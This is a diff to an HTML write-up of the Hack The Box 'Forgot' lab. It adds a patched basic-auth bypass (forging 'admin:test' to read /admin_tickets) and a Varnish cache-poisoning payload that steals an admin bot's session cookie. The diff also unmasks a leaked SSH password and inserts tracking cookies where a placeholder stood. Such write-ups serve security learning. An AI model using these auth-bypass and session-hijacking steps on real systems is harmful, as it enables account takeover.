@@ -211,16 +211,9 @@ password=test
 <li>After resetting the password, we can now login as <code>robert-dev-10045</code></li>
 </ul>
 <h1 id="foothold">Foothold</h1>
+<h2 id="unintended-patched">Unintended (patched)</h2>
 <ul>
-<li>Examine the source at <code>http://10.129.71.155/escalate</code> found the following paths, which reveals a path to <code>/admin_tickets</code></li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home&#34;</span>&gt;home&lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/tickets&#34;</span>&gt;tickets&lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/escalate&#34;</span>&gt;escalate&lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/admin_tickets&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;disabled&#34;</span>&gt;tickets(escalated)&lt;/<span style="color:#f92672">a</span>&gt;     
-</span></span></code></pre></div><ul>
-<li>Examine the request&rsquo;s <code>Authorization</code> header shows that it uses basic auth. Decode the base64 content shows that it&rsquo;s using our changed credential: <code>robert-dev-10045:test</code>.</li>
-<li>Change this to <code>admin:test</code> (i.e <code>YWRtaW46dGVzdA==</code>) and re-encode with base64 and send a request to <code>/admin_tickets</code> returns the content of an admin support ticket which contains the password of a user <code>diego</code></li>
+<li>Examine the request <code>Authorization</code> shows that it uses basic auth. Encode the base64 shows that it&rsquo;s using our change <code>robert-dev-10045:test</code>. Change this to <code>admin:test</code> and re-encode with base64 and send a request to <code>/admin_tickets</code> returns the content of an admin support ticket which contains the password of a user <code>diego</code></li>
 </ul>
 <pre tabindex="0"><code># request
 GET /admin_tickets HTTP/1.1
@@ -231,7 +224,7 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Authorization: Basic YWRtaW46dGVzdA==
 Connection: close
-Cookie: &lt;cookies&gt;
+Cookie: __hstc=86713927.acdedc55b8bb6d759b0dd7e9b0970e55.1668370499968.1668370499968.1668376510196.2; hubspotutk=acdedc55b8bb6d759b0dd7e9b0970e55; __hssrc=1; __hssc=86713927.18.1668376510196
 Upgrade-Insecure-Requests: 1
 
 # response
@@ -239,12 +232,26 @@ Upgrade-Insecure-Requests: 1
     &lt;td&gt;SSH Credentials are not working for Jenkins Slave machine&lt;/td&gt;
     &lt;td&gt;Diego (Devops Lead)&lt;/td&gt;
     &lt;td&gt;http://forgot.htb/tickets/102&lt;/td&gt;
-    &lt;td&gt;I&amp;#39;ve tried with diego:d**********q. The automation tasks has been blocked due to this issue. Please resolve this at the earliest&lt;/td&gt;
+    &lt;td&gt;I&amp;#39;ve tried with diego:dCb#1!x0%gjq. The automation tasks has been blocked due to this issue. Please resolve this at the earliest&lt;/td&gt;
 &lt;/tr&gt;
 </code></pre><ul>
-<li>Login as <code>diego</code> via ssh to get the user flag</li>
+<li>Login as <code>diego</code> to get the user flag</li>
 </ul>
-<h1 id="pe">PE</h1>
+<h2 id="intended-cache-poisoning">Intended: cache poisoning</h2>
+<ul>
+<li>Browsing the web application&rsquo;s response header will spot a header called: <code>x-varnish</code> and response header: <code>via: 1.1 varnish</code>. This indicates a cache poisoning vulnerability: <a href="https://labs.withsecure.com/advisories/plone-cms-cache-poisoning-xss-vulnerability">https://labs.withsecure.com/advisories/plone-cms-cache-poisoning-xss-vulnerability</a></li>
+<li>To exploit</li>
+</ul>
+<pre tabindex="0"><code># Intercept req: http://10.10.11.188/escalate with the following payload
+to=Admin&amp;link=http://10.10.11.188/static/meow/meow.png&amp;reason=httt&amp;issue=Getting error while accessing search feature in enterprise platform.
+
+# Wait a while for the admin bot to visit the ticket and then browse to
+http://10.10.11.188/static/meow/meow.png
+
+# This will contain the admin bot&#39;s session cookie in the response header
+# Substitute your cookie with the admin&#39;s cookie and browse to:
+http://10.10.11.188/admin_tickets
+</code></pre><h1 id="pe">PE</h1>
 <ul>
 <li>From <code>bot.py</code>, we can loot the admin pass and db pass</li>
 </ul>
